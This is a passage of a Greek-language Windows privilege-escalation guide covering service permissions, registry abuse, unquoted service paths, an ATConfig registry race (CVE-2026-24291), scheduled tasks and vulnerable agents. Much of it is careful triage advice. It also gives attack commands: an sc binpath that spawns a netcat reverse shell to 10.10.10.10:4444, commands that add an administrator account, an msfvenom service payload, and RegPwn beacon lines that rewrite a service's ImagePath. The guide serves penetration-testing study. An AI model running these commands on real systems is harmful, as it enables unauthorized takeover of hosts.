Για μια υπάρχουσα υπηρεσία, το [`SERVICE_START` επιτρέπει την παροχή ορισμάτων στη `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)· είναι διαφορετικό από το [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Ελέγξτε τον κώδικα της υπηρεσίας ή την τεκμηριωμένη διεπαφή της πριν θεωρήσετε ότι το δικαίωμα εκκίνησης είναι κάτι περισσότερο από δικαίωμα ελέγχου. Αν χρησιμοποιεί όρισμα που επιλέγει ο καλών ως διαδρομή log ή εξαγωγής, επαληθεύστε την ταυτότητα της υπηρεσίας, την ακριβή ροή από το όρισμα στην εγγραφή, τους περιορισμούς διαδρομής και τα δικαιώματα του **δημιουργημένου αρχείου**. Η εγγραφή σε προστατευμένο κατάλογο μπορεί να οδηγήσει σε κλιμάκωση μόνο αν υπάρχει ξεχωριστός προνομιούχος καταναλωτής ή loader που αποδέχεται αυτό το αρχείο· ένα εγγράψιμο log ή το δικαίωμα εκκίνησης από μόνο του δεν αρκεί. Η παθητική απογραφή δεν πρέπει να εκκινεί την υπηρεσία ή να δημιουργεί δοκιμαστικό αρχείο.

Για έναν NSClient++ monitoring agent, ένα αναγνώσιμο `nsclient.ini` αποτελεί **ένδειξη για έλεγχο ρυθμίσεων**: ενδέχεται να περιέχει διαπιστευτήρια web, ενώ το `boot.ini` μπορεί να ανακατευθύνει τη ρύθμιση σε άλλη θέση. Ελέγξτε τον πραγματικό λογαριασμό υπηρεσίας, τον WEB listener και την πολιτική πρόσβασης, καθώς και αν ο πιστοποιημένος ρόλος μπορεί να αλλάξει ρυθμίσεις ή scripts. Η προνομιούχα εκτέλεση απαιτεί επιπλέον `CheckExternalScripts` (ή άλλη ενεργοποιημένη διαδρομή εκτέλεσης), ουσιαστικό δικαίωμα καταχώρισης ή τροποποίησης εντολής και trigger που την εκτελεί με την ταυτότητα της υπηρεσίας. Ένας listener που είναι διαθέσιμος μόνο μέσω loopback μπορεί και πάλι να είναι προσβάσιμος από τοπικό χρήστη, αλλά η διαδρομή αρχείου, ο κωδικός πρόσβασης ή ο listener από μόνος του δεν αποδεικνύει την ύπαρξη αυτών των δικαιωμάτων. Ελέγξτε τα metadata και τα δικαιώματα χωρίς να εμφανίσετε μυστικά ή να καλέσετε το web API κατά την παθητική απαρίθμηση. Δείτε τη [διάταξη αρχείων του NSClient++](https://nsclient.org/docs/concepts/file-layout/), τις [οδηγίες ασφάλειας για web και scripts](https://nsclient.org/docs/setup/securing/) και τη [ρύθμιση external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Για μια υπηρεσία της οποίας το `ImagePath` είναι `nssm.exe`, ελέγξτε τον πραγματικό λογαριασμό εκτέλεσης της υπηρεσίας και την τιμή `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [το NSSM αποθηκεύει εκεί την εφαρμογή-child](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), ενώ το `AppDirectory` είναι ο ρυθμισμένος κατάλογος εργασίας της. Ελέγξτε το εκτελέσιμο αρχείο-child και τα ACL των γονικών καταλόγων του πριν θεωρήσετε ότι τα δικαιώματα του wrapper αποτελούν ολόκληρο το όριο ασφαλείας της υπηρεσίας. Ένα τοπικό endpoint WCF ή SOAP που εκθέτει αυτό το child αποτελεί ξεχωριστή ένδειξη προς διερεύνηση: επιβεβαιώστε ότι ο listener είναι προσβάσιμος από τον χρήστη χαμηλότερων δικαιωμάτων, ότι η συγκεκριμένη λειτουργία δέχεται την είσοδό του και ότι το service child εκτελεί την μη ασφαλή λειτουργία με υψηλότερη ταυτότητα. Ο λογαριασμός υπηρεσίας, ένα URL endpoint ή μια εγγράψιμη διαδρομή από μόνα τους δεν αποδεικνύουν κλιμάκωση· αποφύγετε την κλήση λειτουργιών της υπηρεσίας κατά την παθητική απαρίθμηση.

Για μια προσαρμοσμένη λειτουργία WCF, ακολουθήστε μια συμβολοσειρά που ελέγχει ο καλών έως οποιοδήποτε PowerShell runspace. Η [`Pipeline.Commands.AddScript προσθέτει κείμενο script`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), ενώ η [`Pipeline.Invoke εκτελεί το pipeline`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Ένα [`netTcpBinding` με διαπιστευτήρια μεταφοράς Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) πιστοποιεί τον client, αλλά η εξουσιοδότηση για κλήση της **συγκεκριμένης** λειτουργίας και η αποτελεσματική ταυτότητα του runspace πρέπει να ελεγχθούν ξεχωριστά. Μια διαδρομή από είσοδο καλούντος με χαμηλότερα δικαιώματα έως το `AddScript` με υψηλότερη ταυτότητα υπηρεσίας αποτελεί όριο εκτέλεσης κώδικα· μια θύρα που ακούει, ένας πιστοποιημένος client ή μια αχρησιμοποίητη μέθοδος σε άσχετο assembly από μόνα τους δεν αποτελούν απόδειξη. Ελέγξτε στατικά την εγκατεστημένη υπηρεσία, το contract, την εξουσιοδότηση και τις ρυθμίσεις impersonation, χωρίς να καλέσετε το endpoint κατά την απαρίθμηση.

Τα Service Triggers επιτρέπουν στα Windows να εκκινούν μια υπηρεσία όταν συμβαίνουν ορισμένες συνθήκες (δραστηριότητα named pipe/RPC endpoint, συμβάντα ETW, διαθεσιμότητα IP, σύνδεση συσκευής, ανανέωση GPO κ.λπ.). Ακόμη και χωρίς δικαιώματα SERVICE_START, συχνά μπορείτε να εκκινήσετε προνομιούχες υπηρεσίες ενεργοποιώντας τα triggers τους. Δείτε εδώ τεχνικές απαρίθμησης και ενεργοποίησης:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Υπηρεσία συλλογής διαγνωστικών του Visual Studio

Οι εγκαταστάσεις του Visual Studio με εργαλεία C/C++ μπορεί να περιλαμβάνουν το `VSStandardCollectorService150`, μια υπηρεσία διαγνωστικών ρυθμισμένη να εκτελείται ως `LocalSystem`. Το [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) χρησιμοποίησε ένα junction και ένα race με object-manager link για να ανακατευθύνει την επαναφορά DACL της υπηρεσίας. Η κλιμάκωση που παρουσιάστηκε απαιτούσε επίσης μια αξιοποιήσιμη διαδρομή επιδιόρθωσης MSI του Visual Studio Setup WMI Provider και τον στόχο `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Το στοιχείο διορθώθηκε τον Ιανουάριο του 2024.

Για παθητική διαλογή, ελέγξτε τον λογαριασμό και τη διαδρομή του εκτελέσιμου αρχείου αυτής της υπηρεσίας, εξετάστε αν υπάρχει η διαδρομή του Setup WMI compiler και επαληθεύστε την κατάσταση patch του εγκατεστημένου στοιχείου. Μια εγγραφή υπηρεσίας, η έκδοση του προϊόντος Visual Studio ή ένα αρχείο compiler από μόνα τους δεν αποδεικνύουν ότι ο host είναι ευάλωτος. Η επιθεώρηση δεν χρειάζεται να εκκινήσει την υπηρεσία ή να εκτελέσει επιδιόρθωση.

Λάβετε μια λίστα υπηρεσιών:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Δικαιώματα

Μπορείτε να χρησιμοποιήσετε το **sc** για να λάβετε πληροφορίες σχετικά με μια υπηρεσία.

```bash
sc qc <service_name>
```

Συνιστάται να έχετε το δυαδικό αρχείο **accesschk** από το _Sysinternals_ για να ελέγξετε το απαιτούμενο επίπεδο προνομίων για κάθε υπηρεσία.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Συνιστάται να ελέγξετε αν οι «Authenticated Users» μπορούν να τροποποιήσουν κάποια υπηρεσία:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Μπορείτε να κατεβάσετε το accesschk.exe για XP από εδώ](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση υπηρεσίας

Αν εμφανίζεται αυτό το σφάλμα (για παράδειγμα με το SSDPSRV):

_Παρουσιάστηκε σφάλμα συστήματος 1058._\
_Δεν είναι δυνατή η εκκίνηση της υπηρεσίας, επειδή είναι απενεργοποιημένη ή επειδή δεν υπάρχουν ενεργοποιημένες συσκευές που να σχετίζονται με αυτήν._

Μπορείτε να την ενεργοποιήσετε χρησιμοποιώντας

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από την SSDPSRV για να λειτουργήσει (για XP SP1)**

**Μια άλλη παράκαμψη** αυτού του προβλήματος είναι να εκτελέσετε:

```
sc.exe config usosvc start= auto
```

### **Τροποποίηση διαδρομής δυαδικού αρχείου υπηρεσίας**

Στο σενάριο όπου η ομάδα "Authenticated users" διαθέτει **SERVICE_ALL_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου δυαδικού αρχείου της υπηρεσίας. Για να τροποποιήσετε και να εκτελέσετε το **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Επανεκκίνηση υπηρεσίας

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Τα δικαιώματα μπορούν να κλιμακωθούν μέσω διαφόρων permissions:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την αναδιαμόρφωση του binary της υπηρεσίας.
- **WRITE_DAC**: Επιτρέπει την αναδιαμόρφωση των permissions, οδηγώντας στη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **WRITE_OWNER**: Επιτρέπει την απόκτηση κυριότητας και την αναδιαμόρφωση των permissions.
- **GENERIC_WRITE**: Κληρονομεί τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **GENERIC_ALL**: Επίσης κληρονομεί τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.

Για τον εντοπισμό και την εκμετάλλευση αυτής της ευπάθειας, μπορεί να χρησιμοποιηθεί το _exploit/windows/local/service_permissions_.

### Αδύναμα permissions στα binaries υπηρεσιών

Αν μια υπηρεσία εκτελείται ως **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ή προνομιούχος λογαριασμός domain, αλλά **χρήστες με χαμηλά προνόμια μπορούν να τροποποιήσουν το EXE της υπηρεσίας ή τον γονικό φάκελό του**, η υπηρεσία μπορεί συχνά να παραβιαστεί **με την αντικατάσταση του binary και την επανεκκίνηση της υπηρεσίας**.

**Ελέγξτε αν μπορείτε να τροποποιήσετε το binary που εκτελείται από μια υπηρεσία** ή αν έχετε **write permissions στον φάκελο όπου βρίσκεται το binary** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Μπορείτε να βρείτε κάθε binary που εκτελείται από μια υπηρεσία χρησιμοποιώντας το **wmic** (όχι στο system32) και να ελέγξετε τα permissions σας χρησιμοποιώντας το **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Μπορείτε επίσης να χρησιμοποιήσετε τα **sc** και **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Αναζητήστε επικίνδυνα ACL που έχουν εκχωρηθεί σε **`Everyone`**, **`BUILTIN\Users`** ή **`Authenticated Users`**, ιδίως δικαιώματα **`(F)`**, **`(M)`** ή **`(W)`** στο εκτελέσιμο αρχείο της υπηρεσίας ή στον κατάλογο που το περιέχει. Μια πρακτική ροή κατάχρησης είναι η εξής:<sup>[[27]](#references)</sup>

1. Επιβεβαιώστε τον λογαριασμό της υπηρεσίας και τη διαδρομή του εκτελέσιμου αρχείου με `sc qc <service_name>`.
2. Επιβεβαιώστε ότι το δυαδικό αρχείο είναι εγγράψιμο με `icacls <path>`.
3. Αντικαταστήστε το δυαδικό αρχείο της υπηρεσίας με ένα payload ή ένα έγκυρο κακόβουλο δυαδικό αρχείο υπηρεσίας.
4. Επανεκκινήστε την υπηρεσία με `sc stop <service_name> && sc start <service_name>` (ή περιμένετε να γίνει επανεκκίνηση ή να ενεργοποιηθεί η υπηρεσία).

Χρήσιμοι αυτοματοποιημένοι έλεγχοι:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Αν η υπηρεσία δεν επιτρέπει σε έναν κανονικό χρήστη να την επανεκκινήσει, ελέγξτε αν ξεκινά αυτόματα κατά την εκκίνηση, αν διαθέτει ενέργεια αποτυχίας που την επανεκκινεί ή αν μπορεί να ενεργοποιηθεί έμμεσα από την εφαρμογή που τη χρησιμοποιεί.

### Δικαιώματα τροποποίησης του μητρώου υπηρεσιών

Θα πρέπει να ελέγξετε αν μπορείτε να τροποποιήσετε κάποιο κλειδί μητρώου υπηρεσίας.\
Μπορείτε να **ελέγξετε** τα **δικαιώματά** σας σε ένα κλειδί **μητρώου** υπηρεσίας ως εξής:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Ελέγξτε αν οι **Authenticated Users** ή **NT AUTHORITY\INTERACTIVE** έχουν δικαιώματα εγγραφής στο κλειδί μητρώου μιας συγκεκριμένης υπηρεσίας. Μια καταχώριση ACL από μόνη της δεν αποδεικνύει ότι υπάρχει πραγματική πρόσβαση: έχουν σημασία οι καταχωρίσεις άρνησης, το τρέχον token και τα κληρονομημένα δικαιώματα. Τα δικαιώματα του κλειδιού μητρώου είναι ξεχωριστά από τα δικαιώματα `SERVICE_CHANGE_CONFIG` και `SERVICE_START` του αντικειμένου υπηρεσίας. Για την κλιμάκωση προνομίων απαιτούνται επίσης ένα αξιοποιήσιμο πεδίο διαμόρφωσης της υπηρεσίας, τρόπος ενεργοποίησής της και μια ταυτότητα υπηρεσίας με περισσότερα προνόμια. Δείτε τα [δικαιώματα κλειδιών μητρώου](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) της Microsoft και την [αναφορά δικαιωμάτων πρόσβασης υπηρεσιών](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Για να αλλάξετε το Path του εκτελέσιμου αρχείου που εκτελείται:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Race συνδέσμου μητρώου για αυθαίρετη εγγραφή τιμής HKLM (ATConfig)

Ορισμένες δυνατότητες προσβασιμότητας των Windows δημιουργούν κλειδιά **ATConfig** ανά χρήστη, τα οποία στη συνέχεια αντιγράφονται από μια διεργασία **SYSTEM** σε ένα κλειδί συνεδρίας HKLM. Μια **race condition συμβολικού συνδέσμου** στο μητρώο μπορεί να ανακατευθύνει αυτήν την προνομιούχα εγγραφή σε **οποιαδήποτε διαδρομή HKLM**, παρέχοντας δυνατότητα **αυθαίρετης εγγραφής τιμής** στο HKLM.<sup>[[18]](#references)</sup>

Βασικές τοποθεσίες (παράδειγμα: Πληκτρολόγιο οθόνης `osk`):

- Η `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` παραθέτει τις εγκατεστημένες δυνατότητες προσβασιμότητας.
- Η `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` αποθηκεύει ρυθμίσεις που ελέγχονται από τον χρήστη.
- Η `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` δημιουργείται κατά τη σύνδεση ή τις μεταβάσεις secure desktop και είναι εγγράψιμη από τον χρήστη.

Ροή κατάχρησης (CVE-2026-24291 / ATConfig):

1. Συμπληρώστε την τιμή **HKCU ATConfig** που θέλετε να εγγράψει η SYSTEM.
2. Ενεργοποιήστε την αντιγραφή secure desktop (π.χ., **LockWorkstation**), η οποία ξεκινά τη ροή AT broker.
3. **Κερδίστε το race** τοποθετώντας ένα **oplock** στο `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`· όταν ενεργοποιηθεί το oplock, αντικαταστήστε το κλειδί **HKLM Session ATConfig** με έναν **registry link** προς έναν προστατευμένο στόχο HKLM.
4. Η SYSTEM εγγράφει την τιμή που επέλεξε ο επιτιθέμενος στη διαδρομή HKLM στην οποία έγινε ανακατεύθυνση.

Αφού αποκτήσετε δυνατότητα αυθαίρετης εγγραφής τιμής HKLM, προχωρήστε σε LPE αντικαθιστώντας τιμές ρύθμισης υπηρεσίας:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/γραμμή εντολών)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Επιλέξτε μια υπηρεσία που μπορεί να εκκινήσει ένας απλός χρήστης (π.χ., **`msiserver`**) και ενεργοποιήστε την μετά την εγγραφή. **Σημείωση:** η δημόσια υλοποίηση του exploit **κλειδώνει τον σταθμό εργασίας** στο πλαίσιο του race.

Παράδειγμα εργαλείων (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Permissions AppendData/AddSubdirectory στο registry υπηρεσιών

Αν έχετε αυτό το δικαίωμα σε ένα registry, σημαίνει ότι **μπορείτε να δημιουργήσετε sub registries μέσα σε αυτό**. Στην περίπτωση των Windows services, αυτό **αρκεί για την εκτέλεση αυθαίρετου κώδικα:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Αν η διαδρομή προς ένα εκτελέσιμο αρχείο δεν βρίσκεται μέσα σε εισαγωγικά, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε τμήμα της διαδρομής που τελειώνει πριν από ένα κενό.

Για παράδειγμα, για τη διαδρομή _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Καταγράψτε όλες τις μη περικλεισμένες σε εισαγωγικά διαδρομές υπηρεσιών, εξαιρώντας όσες ανήκουν στις ενσωματωμένες υπηρεσίες των Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Μπορείτε να εντοπίσετε και να εκμεταλλευτείτε** αυτή την ευπάθεια με το metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε να δημιουργήσετε χειροκίνητα ένα εκτελέσιμο αρχείο υπηρεσίας με το metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Ενέργειες αποκατάστασης

Τα Windows επιτρέπουν στους χρήστες να καθορίσουν τις ενέργειες που θα εκτελούνται αν αποτύχει μια υπηρεσία. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα δυαδικό αρχείο. Αν αυτό το αρχείο μπορεί να αντικατασταθεί, ενδέχεται να είναι δυνατή η κλιμάκωση προνομίων. Περισσότερες λεπτομέρειες υπάρχουν στην [επίσημη τεκμηρίωση](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Στόχοι script προγραμματισμένων εργασιών

Για μια ενεργοποιημένη εργασία που εκτελεί `cmd.exe /c` με ένα αρχείο `.bat` ή `.cmd`, ελέγξτε τόσο το script που αναφέρεται στα **ορίσματα ενέργειας** όσο και το `cmd.exe`. Το ίδιο ισχύει και για το ρητό όρισμα αρχείου ενός interpreter, όπως το `-File` του PowerShell. Αν ένα προγραμματισμένο batch file περιέχει κυριολεκτική κλήση PowerShell `-File`, ελέγξτε επίσης τα ACL του αναφερόμενου script· οι μεταβλητές, οι συνθήκες και η αλυσιδωτή εκτέλεση εντολών απαιτούν χειροκίνητη ιχνηλάτηση. Ένα script ή ένας γονικός κατάλογος στον οποίο μπορεί να γράψει ο καλών αποτελεί ένδειξη για εκτέλεση μεταξύ λογαριασμών μόνο όταν ο ρυθμισμένος λογαριασμός εκτέλεσης της εργασίας διαφέρει από τον λογαριασμό του καλούντος και η εργασία πράγματι φτάνει σε αυτή την ενέργεια. Ένα ACL που επιτρέπει μόνο προσθήκη μπορεί να έχει σημασία για τα scripts, αλλά μια προηγούμενη εντολή `exit` ή άλλη ροή ελέγχου μπορεί να καθιστά τις γραμμές που προστίθενται μη προσβάσιμες. Επιβεβαιώστε τα πραγματικά δικαιώματα ACL, το [πλαίσιο εκτέλεσης της εργασίας](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), τον κατάλογο εργασίας, την ενεργοποίηση και την πολιτική ελέγχου εφαρμογών προτού ισχυριστείτε ότι είναι δυνατή η κλιμάκωση προνομίων. Η απογραφή δεν πρέπει να τροποποιεί το script ή να εκκινεί την εργασία.

## Named streams σε προσβάσιμα αρχεία

Στο NTFS, ένα αναγνώσιμο αρχείο μπορεί να έχει ένα named stream `:$DATA`, το περιεχόμενο του οποίου δεν εμφανίζεται σε μια συνηθισμένη λίστα καταλόγου. Για ένα μικρό, σχετικό σύνολο προσβάσιμων αντιγράφων ασφαλείας ή αρχείων ρυθμίσεων, ελέγξτε τα **ονόματα και τα μεγέθη** των streams πριν ανοίξετε οποιοδήποτε περιεχόμενο· τα Windows τα εκθέτουν μέσω των [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), καθώς και μέσω της εντολής PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Ένα όνομα stream που υποδηλώνει μυστικό αποτελεί μόνο ένδειξη. Ελέγξτε τα πραγματικά δικαιώματα ανάγνωσης του αρχείου, αν το σύστημα αρχείων υποστηρίζει streams, αν το stream περιέχει διαπιστευτήρια που μπορούν να χρησιμοποιηθούν και σε ποιον λογαριασμό πραγματοποιούν πράγματι έλεγχο ταυτότητας. Αποφύγετε τις αναδρομικές σαρώσεις streams και την εκτύπωση του περιεχομένου τους κατά τη συνήθη απαρίθμηση.

## Είσοδοι βοηθητικών εργαλείων του Windows Driver Kit σε προγραμματισμένες εργασίες

Το προαιρετικό Windows Driver Kit περιλαμβάνει το `StandaloneRunner.exe`, το οποίο μπορεί να χρησιμοποιήσει τα αρχεία `command.txt`, `reboot.rsf` και project `working\rsf.rsf` από τον κατάλογο εκτέλεσής του. Μια προγραμματισμένη εργασία ή υπηρεσία που εκκινεί αυτό το βοηθητικό πρόγραμμα με προνομιούχο λογαριασμό μπορεί να μετατρέψει την πρόσβαση εγγραφής χαμηλών προνομίων σε αυτά τα αρχεία εισόδου σε εκτέλεση εντολών στο πλαίσιο αυτού του λογαριασμού, ακόμη κι όταν το ίδιο το εκτελέσιμο του βοηθητικού προγράμματος είναι προστατευμένο. Επιβεβαιώστε ότι υπάρχει προνομιούχος καταναλωτής και ότι μπορούν να δημιουργηθούν ή να τροποποιηθούν **και τα δύο** συνοδευτικά αρχεία· η απλή εύρεση του βοηθητικού προγράμματος δεν αρκεί.

Για μια προγραμματισμένη εργασία, ελέγξτε το [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) της ενέργειάς της και τα ACL των δύο διαδρομών των συνοδευτικών αρχείων. Αν η εργασία δεν καθορίζει κατάλογο εργασίας, ο κατάλογος του εκτελέσιμου είναι μόνο μια ένδειξη προς επαλήθευση, όχι απόδειξη για το πού διαβάζει η εργασία τα αρχεία εισόδου της. Πρέπει επίσης να πληρούται η προϋπόθεση για το αρχείο εργασίας του project. Ελέγξτε τον πραγματικό λογαριασμό εκτέλεσης της εργασίας, αντί να υποθέσετε ότι εκτελείται ως SYSTEM.

## Εφαρμογές

### Εγκατεστημένες εφαρμογές

Ελέγξτε τα **δικαιώματα των δυαδικών αρχείων** (ίσως μπορείτε να αντικαταστήσετε κάποιο και να κλιμακώσετε προνόμια) και των **φακέλων** ([DLL Hijacking](dll-hijacking/index.html).)

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Διαδρομή επιδιόρθωσης του Checkmk Windows agent

Το [CVE-2024-0670](https://checkmk.com/werk/16361) επηρεάζει παλαιότερους Checkmk Windows agents, οι οποίοι έγραφαν αρχεία εντολών στο `C:\Windows\Temp` και, όταν αποτύγχανε η αντικατάσταση, εκτελούσαν ένα προϋπάρχον αρχείο με προστασία εγγραφής. Ο προμηθευτής διόρθωσε το πρόβλημα στις εκδόσεις 2.1.0p40, 2.2.0p23, 2.3.0b1 και 2.4.0b1. Ελέγξτε το πλήρες εγκατεστημένο επίπεδο ενημέρωσης και αν μπορεί να εκτελεστεί η επηρεαζόμενη λειτουργία του agent· μια ένδειξη μόνο του κλάδου, όπως `2.1`, δεν αρκεί για να διαπιστωθεί αν υπάρχει έκθεση. Η απαρίθμηση μπορεί να ελέγξει την έκδοση, την κατάσταση της υπηρεσίας και τα δικαιώματα του Temp χωρίς να δημιουργήσει αρχεία ή να ενεργοποιήσει εντολές του agent.

#### Έλεγχος υπηρεσίας SAML του ADSelfService Plus

Το [CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) επηρέαζε το ADSelfService Plus build 6210 και παλαιότερα· ο προμηθευτής το διόρθωσε στο build 6211. Το ζήτημα αφορά μόνο εγκαταστάσεις όπου το SAML SSO **είναι ή ήταν** ενεργοποιημένο. Επομένως, μια καταχώριση εγκατεστημένου προϊόντος ή μια διαδρομή υπηρεσίας αποτελεί ένδειξη προς διερεύνηση, όχι απόδειξη ευπάθειας: επιβεβαιώστε το ακριβές build, το ιστορικό ρυθμίσεων SAML, την προσβασιμότητα της υπηρεσίας μέσω δικτύου και τον λογαριασμό με τον οποίο εκτελείται. Η εκτέλεση κώδικα μέσω της υπηρεσίας κληρονομεί τα δικαιώματα αυτού του λογαριασμού· εκτέλεση ως SYSTEM απαιτεί το αντίστοιχο στιγμιότυπο να εκτελείται ως SYSTEM. Ένα αναγνώσιμο `OfflineBackup_*.ezip` στον κατάλογο Backup του προϊόντος αποτελεί ξεχωριστή ένδειξη κρυπτογραφημένου αντιγράφου ασφαλείας, όχι απόδειξη έγκυρων διαπιστευτηρίων ή του συγκεκριμένου σφάλματος SAML. Καταγράψτε τη διαδρομή και τα δικαιώματα πρόσβασης χωρίς να το αποσυμπιέσετε κατά την τακτική απαρίθμηση.

#### Όρια Jenkins controller και λογαριασμών τομέα

